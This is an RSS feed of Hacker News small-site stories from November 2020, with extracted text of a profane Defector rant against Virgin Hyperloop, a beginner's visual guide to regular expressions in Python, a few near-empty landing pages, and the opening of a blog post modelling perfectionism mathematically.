<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 10]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 10. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 15 Nov 2020 20:18:36 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-10.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 15 Nov 2020 20:18:36 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Virgin Hyperloop Has Invented the World's Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25090938">thread link</a>) | @Osiris30
<br/>
November 14, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090938</guid>
            <pubDate>Sat, 14 Nov 2020 08:03:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A GAN to generate dithers minimising frame difference for a slow movie player]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25090215">thread link</a>) | @fkramink
<br/>
November 13, 2020 | http://matpalm.com/blog/dithernet_vsmp/ | <a href="https://web.archive.org/web/*/http://matpalm.com/blog/dithernet_vsmp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body_wrapper">
<div id="content">

<div id="main_content">
<div id="content_spacer">


<div>
<p>If this is your site then you need to know that you are currently in suspended service mode. This can happen for a variety of reasons but usually is a billing issue; changed/expired credit card details for example.</p>
<p>Rest assured it will only take a few minutes to get you back up and running again. Just follow the instructions below:</p>
<ul>
	
<li>If you require any further assistance then click on the Live Chat customer service button below</li>
</ul>
<!-- live chat box -->
<p><a href="https://secure.livechatinc.com/licence/5378181/v2/open_chat.cgi?groups=1"><img src="https://www.hostfast.com/hostbig/images/livechat-btn-hb.png" width="196" height="76" alt="Live Chat"></a>

</p></div><!-- close susp-cont -->

</div><!-- End Spacer -->
</div><!-- close main content -->
</div>
</div></div>]]>
            </description>
            <link>http://matpalm.com/blog/dithernet_vsmp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090215</guid>
            <pubDate>Sat, 14 Nov 2020 04:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Visual Guide to Regular Expression]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25090112">thread link</a>) | @gilad
<br/>
November 13, 2020 | https://amitness.com/regex/ | <a href="https://web.archive.org/web/*/https://amitness.com/regex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s a common task in NLP to either check a text against a pattern or extract parts from the text that matches a certain pattern. A regular expression or “regex” is a powerful tool to achieve this.</p>
<p>While powerful, regex can feel daunting as it comes with a lot of features and sub-parts that you need to remember.</p>
<p>In this post, I will illustrate the various concepts underlying regex. The goal is to help you build a good mental model of how a regex pattern works.</p>
<h2 id="mental-model">Mental Model</h2>
<p>Let’s start with a simple example where we are trying to find the word ‘cool’ in the text.</p>
<p><img src="https://amitness.com/images/regex-mental-model-example.png" alt=""></p>
<p>With regex, we could simply type out the word ‘cool’ as the pattern and it will match the word.</p>

<p>While regex matched our desired word ‘<strong>cool</strong>’, the way it operates is not at the word level but the character level. This is the key idea.</p>
<blockquote>
<p><strong>Key Idea</strong>: Regex works at the character-level, not word-level.</p>
</blockquote>
<p><img src="https://amitness.com/images/regex-working.png" alt=""></p>
<p>The implication of this is that the regex <code>r'cool'</code> would match the following sentences as well.</p>
<p><img src="https://amitness.com/images/regex-exact-word-match.png" alt=""></p>
<h2 id="basic-building-blocks">Basic Building Blocks</h2>
<p>Now that we understand the key idea, let’s understand how we can match simple characters using regex.</p>
<h3 id="a-specific-character">a. Specific character</h3>
<p>We can simply specify the character in the regular expression and it will match all instances in the text.</p>
<p>For example, a regular expression given below will match all instances of ‘a’ in the text. You can use any of the small and capital alphabets.</p>

<p><img src="https://amitness.com/images/regex-match-only-a.png" alt=""></p>
<p>You can also use any digits from 0 to 9 and it will work as well.</p>

<p><img src="https://amitness.com/images/regex-python-3.7-example.png" alt=""></p>
<p>Note that regex is case-sensitive by default and thus the following regex won’t match anything.</p>

<p><img src="https://amitness.com/images/regex-not-matched-by-capital-a.png" alt=""></p>
<h3 id="b-white-space-character">b. White space character</h3>
<p>We can detect special characters such as whitespace and newlines using special escape sequences.</p>
<p><img src="https://amitness.com/images/regex-white-space-characters.png" alt=""></p>
<p>Besides the common ones above, we have:</p>
<ul>
<li><strong>\r</strong> for carriage return</li>
<li><strong>\f</strong> for form feed</li>
<li><strong>\e</strong> for escape.</li>
</ul>
<h3 id="c-special-sequences">c. Special sequences</h3>
<p>Regex provides a bunch of built-in special symbols that can match a group of characters at once. These begin with backslash <code>\</code>.</p>
<h4 id="pattern-d">Pattern: <code>\d</code></h4>
<p>It matches any single-digit number between 0 to 9.</p>
<p><img src="https://amitness.com/images/regex-single-digit.png" alt=""></p>
<p>Notice that matches are single digit. So we have 4 different matches below instead of a single number <code>18.04</code>.</p>
<p><img src="https://amitness.com/images/regex-ubuntu-18.04.png" alt=""></p>
<h4 id="pattern-s">Pattern: \s</h4>
<p>It matches any whitespace character (<span>space</span>, <span>tab</span> or <span>newline</span>).</p>
<p><img src="https://amitness.com/images/regex-match-any-whitespace.png" alt=""></p>
<h4 id="pattern-w">Pattern: \w</h4>
<p>It matches any of the small alphabets(a to z), capital alphabets(A to Z), digits (0 to 9), and underscore.</p>
<p><img src="https://amitness.com/images/regex-slash-w.png" alt=""></p>
<h4 id="pattern-">Pattern: .</h4>
<p>It matches any character except the new line (\n).</p>
<p><img src="https://amitness.com/images/regex-everything-except-newline.png" alt=""></p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>&gt;&gt;&gt;</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r'.'</span><span>,</span> <span>'line 1</span><span>\n</span><span>line2'</span><span>)</span>
<span>[</span><span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>' '</span><span>,</span> <span>'1'</span><span>,</span> <span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>'2'</span><span>]</span>
</code></pre></div></div>
<h4 id="pattern-negations">Pattern: Negations</h4>
<p>If you use the capitalized versions of the patterns above, they act as negation.</p>
<p>For example, if “\d” matched any digits from 0 to 9, then “\D” will match anything except “0 to 9”.</p>
<p><img src="https://amitness.com/images/regex-negation.png" alt=""></p>
<h3 id="d-character-sets">d. Character sets</h3>
<p>These are patterns starting with <code>[</code> and ending with <code>]</code> and specify the characters that should be matched enclosed by brackets.</p>
<p>For example, the following pattern matches any of the characters ‘a’, ‘e’, ‘i’, ‘o’, and ‘u’.
<img src="https://amitness.com/images/regex-aeiou.png" alt=""></p>
<p>You can also replicate the functionality of <code>\d</code> using the below pattern. It will match any digits between 0 to 9.
<img src="https://amitness.com/images/regex-1-to-9.png" alt=""></p>
<p>Instead of specifying all the digits, we can use <code>-</code> to specify only start and end digits. So, instead of <code>[0123456789]</code>, we can do:</p>
<p><img src="https://amitness.com/images/regex-refactor-all-digits.png" alt=""></p>
<p>For example, <code>[2-4]</code> can be used to match any digits between 2 to 4 i.e. (2 or 3 or 4).</p>
<p><img src="https://amitness.com/images/regex-year-2014-example.png" alt=""></p>
<p>You can even use the special characters we learned previously inside the brackets. For example, you can match any digit from 0 to 9 or whitespace as:</p>
<p><img src="https://amitness.com/images/regex-whitespace-or-digit.png" alt=""></p>
<p>Below, I have listed some useful common patterns and what they mean.</p>
<p><img src="https://amitness.com/images/regex-common-pattern-for-bracket.png" alt=""></p>
<h3 id="e-anchors">e. Anchors</h3>
<p>Regex also has special handlers to make the pattern only match if it’s at the start or end of the string.</p>
<p>We can use the <code>^</code> anchor to match patterns only at the start of a line. For example:</p>
<p><img src="https://amitness.com/images/regex-start-anchor.png" alt=""></p>
<p>Similarly, we can use the <code>$</code> anchor after the character to match patterns only if it’s the end of the line. For example:</p>
<p><img src="https://amitness.com/images/regex-anchor-end.png" alt=""></p>
<h3 id="f-escaping-metacharacters">f. Escaping metacharacters</h3>
<p>Consider a case where we want to exactly match the word “Mr. Stark”.</p>
<p>If we write a regex like <code>Mr. Stark</code>, then it will have an unintended effect. Since we know dot has a special meaning in a regex.</p>
<p><img src="https://amitness.com/images/regex-dot-issue.png" alt=""></p>
<p>So, we should always escape the special metacharacters like <code>.</code>, <code>$</code> etc. if our goal is to match the exact character itself.</p>
<p><img src="https://amitness.com/images/regex-dot-fixed.png" alt=""></p>
<p>Here is the list of metacharacters that you should remember to escape if you’re using them directly.</p>
<div><div><pre><code>^ $ . * + ? { } [ ] \ | ( )
</code></pre></div></div>
<h2 id="repetition-of-basic-blocks">Repetition of basic blocks</h2>
<p>Now that we can pattern match any characters, we could repeat things and start building more complicated patterns.</p>
<h3 id="a-naive-repetition">a. Naive repetition</h3>
<p>Using only what we have learned so far, a naive way would be to just repeat the pattern. For example, we can match two-digit numbers by just repeating the character-level pattern.</p>

<p><img src="https://amitness.com/images/regex-slash-d-slash-d.png" alt=""></p>
<h3 id="b-quantifiers">b. Quantifiers</h3>
<p>Regex provides special quantifiers to specify different types of repetition for the character preceding it.</p>
<h4 id="i-fixed-repetition">i. Fixed repetition</h4>
<p>We can use the <code>{...}</code> quantifier to specify the number of times a pattern should repeat.</p>
<p><img src="https://amitness.com/images/regex-manual-counts.png" alt=""></p>
<p>For example, the previous pattern for matching 2-digit number can be recreated as:</p>
<p><img src="https://amitness.com/images/regex-it-is-2020.png" alt=""></p>
<p>You can also specify a range of repetitions using the same quantifier. For example, to match from 2-digit to 4-digit numbers, we could use the pattern:</p>
<p><img src="https://amitness.com/images/regex-min-max-count.png" alt=""></p>
<p>When applied to a sentence, it will match both 4-digit and 2-digit numbers.</p>
<p><img src="https://amitness.com/images/regex-20-years-old.png" alt=""></p>
<div>
<p><strong>Note:</strong></p><p>
There should not be any space between minimum and maximum count For example, \d{2, 4} doesn't work.
</p>
</div>
<h4 id="ii-flexible-quantifiers">ii. Flexible quantifiers</h4>
<p>Regex also provides quantifiers “*”, “+” and “?” using which you can specify flexible repetition of a character.</p>
<ul>
<li>
<p><strong>0 or 1 times</strong>: <code>?</code><br>
The <code>?</code> quantifier matches the previous character if it repeats 0 or 1 times. This can be useful to make certain parts optional. It is equivalent to <code>{0,1}</code>.</p>
<p><img src="https://amitness.com/images/regex-question-mark-clarify.png" alt=""></p>
<p>For example, let’s say we want to match both the word “sound” and “sound” where “s” is optional. Then, we can use the <code>?</code> quantifier that matches if a character repeats 0 or 1 times.<br>
<img src="https://amitness.com/images/regex-question-mark-example.png" alt=""></p>
</li>
<li>
<p><strong>one or more times</strong>: <code>+</code><br>
The <code>+</code> quantifier matches the previous character if it repeats 1 or more times. It is equivalent to <code>{1,}</code>.</p>
<p>For example, we could find numbers of any arbitrary length using the regex <code>\d+</code>.</p>
<p><img src="https://amitness.com/images/regex-example-of-plus.png" alt=""></p>
</li>
<li>
<p><strong>zero or more times</strong>: <code>*</code><br>
The <code>*</code> quantifier matches the previous character if it repeats zero or more times. It is equivalent to <code>{0,}</code>.</p>
</li>
</ul>
<h2 id="usage-in-python">Usage in Python</h2>
<p>Python provides a module called “re” in the standard library to work with regular expression.</p>
<h3 id="need-for-raw-strings">Need for raw strings</h3>
<p>To specify a regular expression in Python, we precede it with <strong>r</strong> to create raw strings.</p>

<p>To understand why we precede with <strong>r</strong>, let’s try printing the expression <strong>\t</strong> without <code>**r**</code>.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>'</span><span>\t</span><span>'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>

</code></pre></div></div>
<p>You can see how when we don’t use raw string, the string <code>\t</code> is treated as the escape character for tab by Python.</p>
<p>Now let’s convert it into raw string. We get back whatever we specified.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>r'\t'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>
\<span>t</span>
</code></pre></div></div>
<h3 id="using-re-module">Using re module</h3>
<p>To use <code>re</code> module, we can start by importing the <code>re</code> module as:</p>

<h4 id="1-refindall">1. re.findall</h4>
<p>This function allows us to get all the matches as a list of strings.</p>
<div><div><pre><code><span>import</span> <span>re</span>
<span>re</span><span>.</span><span>findall</span><span>(</span><span>r'\d'</span><span>,</span> <span>'123456'</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>['1', '2', '3', '4', '5', '6']
</code></pre></div></div>
<h4 id="2-rematch">2. re.match</h4>
<p>This function searches for a pattern at the beginning of the string and returns the first occurrence as a match object. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>&lt;re.Match object; span=(0, 6), match='batman'&gt;
</code></pre></div></div>
<p><img src="https://amitness.com/images/regex-match-object.png" alt=""></p>
<p>With the match object, we can get the matched text as</p>


<p>In a case where our pattern is not at the start of the sentence, we will not get any match.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'The batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>

<h4 id="3-research">3. re.search</h4>
<p>This function also finds the first occurrence of a pattern but the pattern can occur anywhere in the text. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>search</span><span>(</span><span>r'batman'</span><span>,</span> <span>'the batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>.</span><span>group</span><span>())</span>
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
<li>A.M. Kuchling, <a href="https://docs.python.org/3/howto/regex.html">“Regular Expression HOWTO - Python 3.9.0 documentation”</a></li>
</ul>
</section></div>]]>
            </description>
            <link>https://amitness.com/regex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090112</guid>
            <pubDate>Sat, 14 Nov 2020 03:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking Hacker News sentiment towards Big Tech companies]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088966">thread link</a>) | @greatwave1
<br/>
November 13, 2020 | https://www.quiverquant.com/sources/hackernews | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p><a href="https://www.quiverquant.com/">
						<img src="https://www.quiverquant.com/static/img/logo.png" alt="">
					</a></p><p>Quiver scrapes alternative stock data from across the internet and aggregates it in a free, easy-to-use web dashboard.</p>
					<div>
						<p><span>Copyright © 2020 Quiver Quantitative, Inc. All rights reserved.</span></p><ul>
							<li><a href="https://www.quiverquant.com/privacypolicy">Privacy Policy</a></li>
							<li><a href="https://www.quiverquant.com/termsofservice">Terms of Service</a></li>
						</ul>
					</div>
				</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/sources/hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088966</guid>
            <pubDate>Fri, 13 Nov 2020 23:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play with Go]]>
            </title>
            <description>
<![CDATA[
Score 75 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25088913">thread link</a>) | @philosopher1234
<br/>
November 13, 2020 | https://play-with-go.dev/guides.html | <a href="https://web.archive.org/web/*/https://play-with-go.dev/guides.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div>
        
        <p>
          A series of hands-on, interactive, browser-based guides that introduce the tools required to work with the Go programming language.
      </p></div>
      <div>
        <p><img src="https://play-with-go.dev/images/gopher.png">
        </p>
      </div>
    </div>


    

    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>An introduction to play-with-go.dev guides</h5>
            <p>Learn about how to get the most out of play-with-go.dev guides</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Get started with Go</h5>
            <p>You've completed the Go tour, so what next? This guide gives a brief introduction to Go programming</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Go fundamentals</h5>
            <p>Primer on creating and using go modules</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Working with private modules</h5>
            <p>How to create, publish and work with non-public modules in your team.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>How to use and tweak Staticcheck</h5>
            <p>Using static analysis to automatically find bugs and performance optimizations.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Developer tools as module dependencies</h5>
            <p>Ensure all developers use the same version of each developer tool</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go</h5>
            <p>Ready to take the plunge and install Go on your system?!</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go programs directly</h5>
            <p>Simple easy-to-remember way to install Go programs</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Retract Module Versions</h5>
            <p>Learn how to flag modules that shouldn't be used</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
  </div>
  </div></div>]]>
            </description>
            <link>https://play-with-go.dev/guides.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088913</guid>
            <pubDate>Fri, 13 Nov 2020 23:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pretty Good Mathematical Model of Perfectionism]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25088396">thread link</a>) | @freefrancisco
<br/>
November 13, 2020 | https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/ | <a href="https://web.archive.org/web/*/https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					

					

					<p>I struggle with perfectionism. Well, not so much “struggle with” — I’m f*cking great at it. It comes naturally.</p>
<p>There are some upsides, but perfectionism is also associated with anxiety, depression, procrastination, and damaged relationships. Perhaps you, like I, have spent far too much time and emotional energy making sure that an email had the right word choice, had no typos, didn’t reuse a phrase in successive sentences/paragraphs, and closed with the ‘correct’ sign-off. (‘Best,’ is almost always optimal, by the way).</p>
<blockquote><p>“If I couldn’t do something that rated 10 out of 10 — or at least close to that — I didn’t want to do it at all. Being a perfectionist was an ongoing source of suffering and unhappiness for me … Unfortunately, many of us have been conditioned to hold ourselves to impossible standards. This is a stressful mind state to live in, that’s for sure.” ~ <a href="https://www.psychologytoday.com/us/blog/turning-straw-gold/201806/how-overcome-your-perfectionist-tendencies" target="_blank" rel="noopener">Tony Bernard J.D.</a></p></blockquote>
<p>The topic of perfectionism confused me for years. Of course you want things to be perfect; why would you ever actively want something to be worse? However, there’s way more to it than that: It’s a complex interplay between effort, time, motivation, and expectations.</p>
<p>Far too many self-help recommendations essentially said “Be ok with mediocrity!” which… did not speak to me, to say the least.</p>
<p>To better understand the concept, I went through a number of books and papers before building a quasi-mathematical model. You know, like ya’do.</p>
<p>I’ve come to see perfectionism as a mindset with a particular calibration between the quality of your work and your emotional reaction — with decreased sensitivity to marginal differences in lower-quality work and increasing sensitivity as the quality goes up.</p>
<p><img data-attachment-id="2370" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/graphs/" data-orig-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=1080%2C560&amp;ssl=1" data-orig-size="1080,560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="graphs" data-image-description="" data-medium-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=300%2C156&amp;ssl=1" data-large-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=630%2C327&amp;ssl=1" loading="lazy" src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;ssl=1" alt="graphs" width="630" height="327" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<ul>
<li><span><strong>In a “Balanced” mindset,</strong> </span>you become happier in linear proportion to how much better your work is going. (y = x)</li>
<li><span><strong>In a “Satisficing” mindset</strong></span> — taking a pass/fail test, for example — you care about whether something is “good enough”. Most of your emotional variance comes as you approach and meet that threshold.&nbsp; ( e^x / (1+e^x) )</li>
<li><span><strong>In a Perfectionist mindset,</strong></span> the relationship between quality and emotion is polynomial. You feel almost equally bad about scoring a 40% on a test vs. a 65%, but the difference between a 90% and 93% looms large. (y = x^7)</li>
</ul>
<p>Looking at the model, I realized it could explain a number of experiences I’d had.</p>
<hr>
<h3>Why even small tasks seem daunting to a perfectionist</h3>
<p>A common experience with a perfectionist mindset is having trouble ‘letting go’ of a project — we want to keep tinkering with it, improving it, and never feel quite comfortable moving on. &nbsp;(I don’t want to say how long this draft sat around.)</p>
<p>This make sense given the model:</p>
